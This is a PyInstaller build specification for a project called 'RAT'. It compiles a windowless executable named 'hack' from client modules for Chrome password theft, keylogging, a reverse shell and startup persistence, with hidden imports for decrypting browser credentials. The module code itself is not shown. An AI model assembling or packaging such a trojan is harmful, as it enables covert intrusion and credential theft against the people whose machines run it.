# -*- mode: python ; coding: utf-8 -*-


block_cipher = None


a = Analysis(
    ['C:/Users/20201260/Desktop/RAT/src/client/client_main.py'],
    pathex=['C:/Users/20201260/AppData/Local/Programs/Python/Python310/Lib/site-packages'],
    binaries=[],
    datas=[('C:/Users/20201260/Desktop/RAT/src/client/__init__.py', '.'), ('C:/Users/20201260/Desktop/RAT/src/client/chrome_passwords.py', '.'), ('C:/Users/20201260/Desktop/RAT/src/client/connection.py', '.'), ('C:/Users/20201260/Desktop/RAT/src/client/keylogger.py', '.'), ('C:/Users/20201260/Desktop/RAT/src/client/rev_shell.py', '.'), ('C:/Users/20201260/Desktop/RAT/src/client/startup.py', '.')],
    hiddenimports=['json', 'sqlite3', 'win32crypt', 'Cryptodome.Cipher.AES', 'ctypes', 'pynput'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)
pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='hack',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon='C:\\Users\\20201260\\Desktop\\RAT\\output\\redRAT.ico',
)
